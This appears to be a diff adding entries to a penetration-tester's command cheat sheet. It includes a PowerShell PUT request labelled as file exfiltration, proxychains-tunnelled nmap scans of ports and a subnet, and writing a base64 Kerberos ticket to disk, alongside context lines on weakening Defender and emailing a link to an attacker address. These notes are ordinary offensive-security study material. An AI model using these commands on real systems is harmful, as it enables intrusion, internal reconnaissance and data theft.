@@ -38,3 +38,12 @@ PowerShell Set-MpPreference -SubmitSamplesConsent 2 (disable automatic send samp
 #2 Invoke-Command -Computer DC-1 -Credential $cred -ScriptBlock { whoami }
 
 swaks --to support@domain.local --from "test@test.com" --header "Subject: Internal web app" --body "http://10.10.14.99:8000/" (Send email with swaks)
+
+Invoke-WebRequest -uri $uri -Method Put -Infile C:\windows\temp\test.txt -ContentType 'application/binary' (exfiltrate file with PUT request)
+
+# fast nmap scans through proxychains
+seq 1 1000 | xargs -P 50 -I{} proxychains nmap -p {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output <IP Address>
+
+seq 1 254 | xargs -P 50 -I{} proxychains nmap -p 80,443,3389,445,22 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 192.168.1.{}
+
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
